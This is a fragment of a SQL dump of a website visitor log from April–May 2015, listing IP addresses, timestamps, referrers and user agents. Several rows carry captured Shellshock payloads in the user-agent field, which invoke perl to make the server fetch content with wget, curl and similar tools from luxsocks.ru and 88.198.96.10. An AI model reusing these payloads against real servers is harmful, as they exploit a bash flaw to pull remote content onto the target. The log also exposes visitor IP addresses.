Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(120,'1.171.73.36','2015-04-20','09:06:41','',''),(121,'210.51.191.250','2015-04-20','09:57:39','',''),(122,'60.21.137.114','2015-04-20','10:48:29','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(123,'69.30.250.18','2015-04-20','11:38:30','','Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.95 Safari/537.36 SE 2.X MetaSr 1.0'),(124,'210.216.54.2','2015-04-20','14:19:42','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'),(125,'112.216.179.210','2015-04-20','17:09:47','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(126,'211.36.147.174','2015-04-20','17:36:08','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(127,'1.169.95.171','2015-04-20','17:47:45','',''),(128,'116.228.70.205','2015-04-20','18:56:29','',''),(129,'1.171.74.66','2015-04-20','19:25:47','',''),(130,'61.240.144.64','2015-04-20','19:50:02','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(131,'61.102.92.100','2015-04-20','21:06:13','','Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; LEN2; rv:11.0) like Gecko'),(132,'118.127.210.135','2015-04-20','21:37:42','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(133,'60.21.141.42','2015-04-20','23:56:08','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(134,'118.165.128.30','2015-04-21','00:00:23','',''),(135,'182.118.53.233','2015-04-21','03:25:50','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(136,'211.36.149.237','2015-04-21','07:35:34','http://106.245.233.50/?auto_login=1','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(137,'182.118.53.81','2015-04-21','07:36:05','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(138,'60.21.141.42','2015-04-21','10:46:08','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(139,'95.173.171.224','2015-04-21','13:37:24','',''),(140,'141.212.122.178','2015-04-21','16:06:54','',''),(141,'61.240.144.64','2015-04-21','21:45:09','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(142,'1.164.38.78','2015-04-22','02:12:29','',''),(143,'60.21.141.42','2015-04-22','15:04:23','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(144,'112.221.70.78','2015-04-22','20:05:04','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(145,'111.249.117.138','2015-04-22','20:53:49','',''),(146,'119.197.27.19','2015-04-22','23:05:16','','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)'),(147,'182.118.53.90','2015-04-23','01:29:06','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(148,'61.240.144.65','2015-04-23','01:33:33','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(149,'60.21.141.42','2015-04-23','03:42:15','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(150,'182.118.53.100','2015-04-23','08:47:02','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(151,'112.216.179.210','2015-04-23','11:04:50','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53'),(152,'111.249.112.226','2015-04-24','01:55:10','',''),(153,'180.87.43.2','2015-04-24','02:02:43','',''),(154,'60.21.141.42','2015-04-24','03:34:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(155,'61.240.144.67','2015-04-24','05:05:41','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(156,'1.171.70.96','2015-04-24','08:34:11','',''),(157,'211.36.130.89','2015-04-24','10:40:37','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(158,'141.212.122.82','2015-04-24','14:07:32','',''),(159,'192.169.249.225','2015-04-24','15:11:44','',''),(160,'1.169.91.133','2015-04-25','02:01:16','',''),(161,'1.164.33.186','2015-04-25','02:04:05','',''),(162,'182.118.54.107','2015-04-25','02:54:35','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(163,'60.21.141.42','2015-04-25','03:06:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(164,'188.138.17.205','2015-04-25','05:14:47','',''),(165,'182.118.55.164','2015-04-25','07:18:44','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(166,'61.240.144.67','2015-04-25','07:49:37','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(167,'95.173.171.224','2015-04-25','08:27:26','',''),(168,'81.21.78.48','2015-04-25','10:10:32','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(169,'218.189.196.37','2015-04-25','10:21:03','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http://88.198.96.10/wget ; curl http://88.198.96.10/curl ; fetch http://88.198.96.10/fetch ; lwp-download http://88.198.96.10/lwp-download ; GET http://88.198.96.10/'),(170,'140.206.123.46','2015-04-25','10:45:50','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(171,'109.228.5.20','2015-04-25','11:06:45','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(172,'195.234.171.80','2015-04-25','11:36:28','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(173,'140.121.81.102','2015-04-25','14:05:52','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(174,'112.221.70.78','2015-04-25','16:35:24','','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36'),(175,'211.115.83.156','2015-04-25','16:59:00','','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko'),(176,'175.223.32.9','2015-04-25','17:09:43','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(177,'118.165.130.58','2015-04-25','19:30:01','',''),(178,'93.189.95.45','2015-04-25','20:12:12','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(179,'220.178.7.181','2015-04-25','21:12:12','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(180,'1.11.144.74','2015-04-25','23:14:58','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(181,'203.162.70.74','2015-04-26','00:25:02','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(182,'62.128.198.169','2015-04-26','01:33:49','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(183,'60.21.141.42','2015-04-26','01:55:19','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(184,'211.36.147.18','2015-04-26','08:55:00','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(185,'61.240.144.65','2015-04-26','10:02:12','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(186,'23.81.30.133','2015-04-26','12:13:15','http://hvd-store.com/','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36'),(187,'112.221.70.78','2015-04-26','12:51:51','http://www.jubinna.com/','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(188,'54.159.226.230','2015-04-26','15:34:54','','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36'),(189,'78.47.155.198','2015-04-27','00:34:55','','Mozilla/5.0 (compatible; Digincore bot; https://www.digincore.com/crawler.html for rules and instructions.'),(190,'213.0.62.65','2015-04-27','02:07:46','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(191,'182.118.53.171','2015-04-27','09:16:49','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(192,'190.102.138.123','2015-04-27','10:12:41','','() { :;};/usr/bin/perl -e \'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"wget http//luxsocks.ru ; wget https://luxsocks.ru --no-check-certificate ; curl http//luxsocks.ru// ; curl -k https://luxsocks.ru ; lwp-download http://luxsocks.ru ; GET '),(193,'61.35.204.100','2015-04-27','13:08:45','http://admin2.gabia.com/domain/DomainAddition/new_service_list.php','Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko'),(194,'61.240.144.64','2015-04-27','13:10:40','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(195,'95.173.171.236','2015-04-27','13:15:40','',''),(196,'1.161.61.238','2015-04-27','13:50:38','',''),(197,'36.226.113.164','2015-04-27','18:15:18','',''),(198,'118.193.226.16','2015-04-27','18:56:42','',''),(199,'60.21.141.42','2015-04-27','22:16:21','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(200,'185.35.62.11','2015-04-28','02:13:25','',''),(201,'220.80.122.100','2015-04-28','06:53:40','','Python-urllib/3.4'),(202,'208.43.251.178','2015-04-28','07:50:02','','Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0;'),(203,'60.21.141.42','2015-04-28','09:11:36','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(204,'61.240.144.64','2015-04-28','16:10:45','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(205,'141.212.122.26','2015-04-28','16:31:18','',''),(206,'1.171.78.43','2015-04-29','06:58:40','',''),(207,'182.118.55.189','2015-04-29','07:44:05','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(208,'60.21.141.42','2015-04-29','08:02:32','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(209,'120.132.76.49','2015-04-29','13:17:42','','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0'),(210,'1.164.42.243','2015-04-29','18:31:13','',''),(211,'61.240.144.65','2015-04-29','19:01:21','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(212,'112.221.70.78','2015-04-29','21:40:53','','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(213,'1.161.19.188','2015-04-29','23:59:18','',''),(214,'222.186.21.70','2015-04-30','02:36:01','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2145.4 Safari/537.36'),(215,'66.240.236.119','2015-04-30','02:56:26','',''),(216,'60.21.141.42','2015-04-30','06:03:06','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(217,'1.171.73.147','2015-04-30','09:20:12','',''),(218,'1.164.39.193','2015-04-30','09:20:37','',''),(219,'69.30.240.46','2015-04-30','18:21:58','',''),(220,'1.164.46.154','2015-04-30','18:33:34','',''),(221,'118.165.129.197','2015-04-30','23:01:55','',''),(222,'60.21.141.42','2015-05-01','04:10:17','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(223,'182.118.53.149','2015-05-01','07:09:51','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(224,'1.171.65.40','2015-05-01','10:41:36','',''),(225,'198.101.238.203','2015-05-01','12:50:04','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24'),(226,'211.36.149.210','2015-05-01','13:55:39','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(227,'61.102.12.196','2015-05-01','13:56:52','','Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)'),(228,'52.11.32.82','2015-05-01','15:38:50','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2)'),(229,'182.213.149.201','2015-05-01','17:31:05','http://www.jubinna.com/','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(230,'141.212.122.34','2015-05-01','20:57:41','',''),(231,'118.165.133.207','2015-05-02','00:24:45','',''),(232,'61.240.144.65','2015-05-02','02:03:39','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(233,'60.21.141.42','2015-05-02','02:35:12','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(234,'198.101.238.203','2015-05-02','04:47:26','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/11.0.696.71 Safari/534.24'),(235,'176.58.98.66','2015-05-02','07:29:17','','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7'),(236,'185.92.223.110','2015-05-02','07:31:34','','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7'),(237,'108.61.176.149','2015-05-02','07:31:47','','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7'),(238,'45.33.67.169','2015-05-02','07:33:47','','Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7'),(239,'1.164.40.133','2015-05-02','10:38:51','',''),(240,'111.249.116.55','2015-05-02','10:51:21','',''),(241,'36.226.116.109','2015-05-02','15:19:02','',''),(242,'1.161.22.5','2015-05-03','00:15:33','',''),(243,'60.21.141.42','2015-05-03','01:38:22','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(244,'61.240.144.65','2015-05-03','04:49:29','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(245,'1.161.62.84','2015-05-03','07:53:16','',''),(246,'182.118.54.93','2015-05-03','08:17:58','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(247,'64.246.165.160','2015-05-03','13:34:36','http://whois.domaintools.com/jubinna.com','Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools)'),(248,'188.138.17.205','2015-05-04','02:16:13','',''),(249,'1.164.32.218','2015-05-04','06:37:49','',''),(250,'60.21.141.42','2015-05-04','10:18:30','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(251,'1.171.78.162','2015-05-04','15:02:31','',''),(252,'1.164.47.84','2015-05-04','15:45:50','',''),(253,'118.37.92.209','2015-05-04','16:33:03','','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; InfoPath.2)'),(254,'104.155.44.36','2015-05-04','18:20:41','','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0'),(255,'118.165.130.38','2015-05-04','20:12:03','',''),(256,'36.226.115.106','2015-05-04','20:17:36','',''),(257,'222.35.16.27','2015-05-04','20:27:44','',''),(258,'185.35.62.11','2015-05-05','02:51:13','',''),(259,'182.118.45.237','2015-05-05','06:46:08','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(260,'104.131.210.125','2015-05-05','08:55:00','http://www.netcraft.com/survey/','Mozilla/4.0 (compatible; Netcraft Web Server Survey)'),(261,'222.186.58.71','2015-05-05','12:37:20','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(262,'141.212.121.152','2015-05-05','13:19:21','',''),(263,'36.226.114.242','2015-05-05','14:10:42','',''),(264,'36.226.112.160','2015-05-05','14:21:16','',''),(265,'27.151.73.58','2015-05-05','19:46:05','','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1'),(266,'1.164.38.70','2015-05-05','19:53:38','',''),(267,'222.186.58.112','2015-05-05','20:27:42','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(268,'61.102.12.196','2015-05-05','21:32:02','','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'),(269,'220.136.144.134','2015-05-06','01:25:52','',''),(270,'125.147.30.79','2015-05-06','02:01:22','',''),(271,'222.186.58.112','2015-05-06','04:25:33','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(272,'1.171.67.8','2015-05-06','07:40:32','',''),(273,'1.169.92.219','2015-05-06','07:54:13','',''),(274,'1.164.43.114','2015-05-06','12:20:29','',''),(275,'222.186.58.121','2015-05-06','12:36:26','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(276,'112.216.179.210','2015-05-06','14:32:01','http://www.jubinna.com/','Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) CriOS/42.0.2311.47 Mobile/11D257 Safari/9537.53'),(277,'1.171.66.51','2015-05-06','16:32:55','',''),(278,'118.165.131.144','2015-05-06','20:36:11','',''),(279,'1.161.17.121','2015-05-07','05:49:46','',''),(280,'1.161.59.126','2015-05-07','06:03:47','',''),(281,'178.18.141.110','2015-05-07','06:18:35','','Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0'),(282,'209.126.230.71','2015-05-07','07:09:06','','StatsInfo'),(283,'182.118.53.194','2015-05-07','07:27:26','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(284,'111.251.48.148','2015-05-07','10:39:18','',''),(285,'62.210.206.180','2015-05-07','12:05:54','',''),(286,'157.55.39.123','2015-05-07','15:37:27','','Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)'),(287,'222.186.58.112','2015-05-07','17:23:28','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(288,'210.51.191.250','2015-05-07','20:13:35','',''),(289,'162.243.207.56','2015-05-07','20:52:11','','Mozilla/5.0 (compatible; NetcraftSurveyAgent/1.0; +info@netcraft.com)'),(290,'1.161.17.187','2015-05-08','05:00:07','',''),(291,'222.186.58.112','2015-05-08','05:03:59','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(292,'199.244.119.246','2015-05-08','06:22:14','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(293,'78.47.155.198','2015-05-08','15:37:35','','Mozilla/5.0 (compatible; Digincore bot; https://www.digincore.com/crawler.html for rules and instructions.'),(294,'61.240.144.64','2015-05-08','18:28:38','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(295,'81.7.8.101','2015-05-08','20:30:08','','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0'),(296,'69.58.178.58','2015-05-08','21:15:01','','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1'),(297,'192.99.40.137','2015-05-09','06:30:42','','Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101  Firefox/28.0'),(298,'66.220.146.27','2015-05-09','06:37:05','','facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'),(299,'66.220.146.25','2015-05-09','06:37:21','','facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'),(300,'66.220.146.26','2015-05-09','06:37:25','','facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)'),(301,'182.118.60.75','2015-05-09','09:03:06','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(302,'216.108.227.23','2015-05-09','10:24:30','JUBINNA.COM','Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/537.36'),(303,'222.186.58.121','2015-05-09','13:03:09','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)'),(304,'89.145.95.2','2015-05-09','15:23:33','','Mozilla/5.0 (compatible; GrapeshotCrawler/2.0; +http://www.grapeshot.co.uk/crawler.php)'),(305,'36.226.112.137','2015-05-09','23:53:55','',''),(306,'96.44.189.100','2015-05-10','03:27:00','','Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0'),(307,'60.190.251.204','2015-05-10','08:26:05','',''),(308,'80.82.78.186','2015-05-10','13:28:57','',''),(309,'117.111.21.235','2015-05-10','13:50:23','','Mozilla/5.0 (Linux; Android 5.0.1; SM-N910L Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36'),(310,'1.161.62.96','2015-05-10','14:38:57','',''),(311,'118.165.130.45','2015-05-10','17:28:16','',''),(312,'175.10.36.116','2015-05-10','18:35:56','',''),(313,'115.114.108.225','2015-05-10','19:21:11','',''),(314,'188.138.17.205','2015-05-10','21:50:49','',''),(315,'1.161.61.193','2015-05-11','05:28:07','',''),(316,'1.161.17.48','2015-05-11','07:20:20','',''),(317,'182.118.53.60','2015-05-11','08:37:53','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2251.0 Safari/537.36'),(318,'111.249.117.211','2015-05-11','13:57:34','',''),(319,'188.138.17.205','2015-05-11','16:36:22','',''),(320,'45.35.5.181','2015-05-11','16:55:30','http://best-seo-report.com','Mozilla/4.0 (compatible; Synapse)'),(321,'210.216.54.2','2015-05-11','17:12:57','','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'),(322,'118.37.92.209','2015-05-11','17:28:45','','Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; GTB7.5; InfoPath.2)'),(323,'121.65.41.44','2015-05-11','18:04:09','','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko Swing/2.0.0.21'),(324,'61.49.45.46','2015-05-11','18:34:04','',''),(325,'223.62.202.37','2015-05-11','18:36:33','','Mozilla/5.0 (Linux; Android 4.4.2; ko-kr; SAMSUNG SM-N900S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Version/1.5 Chrome/28.0.1500.94 Mobile Safari/537.36'),(326,'110.70.57.16','2015-05-11','18:46:52','','Mozilla/5.0 (Linux; Android 4.4.2; LG-F340K Build/KOT49I.F340K20d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 Swing(And)/1.10.2.2'),(327,'60.21.141.42','2015-05-11','19:02:02','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)'),(328,'218.101.218.193','2015-05-11','19:24:51','','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36'),(329,'61.240.144.67','2015-05-12','01:43:01','','masscan/1.0 (https://github.com/robertdavidgraham/masscan)'),(330,'1.163.65.44','2015-05-12','02:02:12','',''),(331,'185.35.62.11','2015-05-12','03:43:59','',''),(332,'1.171.68.68','2015-05-12','04:32:24','',''),(333,'60.21.141.42','2015-05-12','05:51:51','','Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; 